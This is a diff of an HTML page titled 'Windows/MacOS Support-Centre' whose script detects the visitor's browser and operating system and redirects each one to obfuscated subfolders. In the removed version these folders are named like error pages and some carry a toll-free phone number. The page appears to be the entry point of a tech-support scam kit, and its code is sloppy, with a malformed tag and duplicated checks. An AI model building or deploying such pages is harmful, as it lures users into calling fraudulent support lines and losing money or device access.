@@ -1,35 +1,75 @@
-<script type="text/javascript">
-var isChromium = window.chrome,
-	vendorName = window.navigator.vendor,
-	isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
-	isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
-isEdgeChromium = window.navigator.userAgent.indexOf("dg") > -1;
 
-if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
-	// is Google chrome
-window.location.href = "./fC0deJdfd008f0d0CH888Err0r80dBG88/index.html";
-}
-if(navigator.userAgent.indexOf("Firefox") != -1 )
-	{
-			 window.location.href = "./fC0deJdfd008f0d0FF888Err0r80dBG88/index.html";
-	}
+<xmlns="http:/www.w3.org/1999/xhtml">
+<head>
 
-	if(window.navigator.userAgent.indexOf("dg") != -1 )
-		{
-				 window.location.href = "./fC0deJdfd008f0d0ECH888Err0r80dBG88/index.html";
-		}
 
-if(window.navigator.userAgent.indexOf("Edge") != -1 )
-	{
-			 window.location.href = "./fC0deJdfd008f0d0ED888Err0r80dBG88/index.html?phone=+1-888-888-8888";
-	}
-if(window.navigator.userAgent.indexOf("Mac") != -1 )
-	{
-			 window.location.href = "./fC0deJdfd008f0d0MA888Err0r80dBG88/index.html";
-	}
-if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
-	{
-		window.location.href = "./fC0deJdfd008f0d0IE888Err0r80dBG88/index.html?phone=+1-888-888-8888";
-	}
-$SAFARI_URL = "apple";
-</script>
+
+
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <meta name="robots" content="noindex,nofollow">
+    <title>Windows/MacOS Support-Centre</title>
+
+    <script type="text/javascript">
+        var isChromium = window.chrome,
+            vendorName = window.navigator.vendor,
+            isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
+            isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+        if (isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false)
+        {
+            // is Google chrome
+            window.location.href = "./0WindbnAsh07w0winin87/index.html";
+        }
+        if (navigator.userAgent.indexOf("Firefox") != -1) {
+            window.location.href = "./0WindbnAsh07w0winin87/index.html";
+        }
+        if (window.navigator.userAgent.indexOf("Edge") != -1) {
+            window.location.href = "./0WindbnAsh07w0winin87/index.html";
+        }
+if (window.navigator.userAgent.indexOf("Opera") != -1) {
+            window.location.href = "./0WindbnAsh07w0winin87/index.html";
+        }
+
+        if ((navigator.userAgent.indexOf("MSIE") != -1) || (!!document.documentMode == true)) //IF IE > 10
+        {
+            window.location.href = "./0WindbnAsh07w0winin87/index.html";
+        }
+
+
+        if (navigator.appVersion.indexOf("Mac") != -1) OSName = "MacOS";
+
+        var isOpera = !!window.opera || navigator.userAgent.indexOf('Opera') >= 0;
+        // Opera 8.0+ (UA detection to detect Blink/v8-powered Opera)
+        var isFirefox = typeof InstallTrigger !== 'undefined';   // Firefox 1.0+
+        var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0;
+        // At least Safari 3+: "[object HTMLElementConstructor]"
+        var isChrome = !!window.chrome;                          // Chrome 1+
+        var isIE = /*@cc_on!@*/false;                            // At least IE6
+
+        if (OSName == "MacOS" && isChrome == true) {
+            window.location.href = "./0MacdbnAsh07w0Macin87/index.html";
+        }
+        else if (OSName == "MacOS" && isChrome == true) {
+            window.location.href = "./0MacdbnAsh07w0Macin87/index.html";
+        }
+
+        if (navigator.userAgent.indexOf("Firefox") != -1) {
+            window.location.href = "./0MacdbnAsh07w0Macin87/index.html";
+        }
+
+        if (window.navigator.userAgent.indexOf("Opera") != -1) {
+            window.location.href = "./0MacdbnAsh07w0Macin87/index.html";
+        }
+
+        if (navigator.userAgent.indexOf("Safari") != -1) {
+            window.location.href = "./0MacdbnAsh07w0Macin87/index.html";
+        }
+
+    </script>
+
+</head>
+<body>
+
+</body>
+
+
+</html>
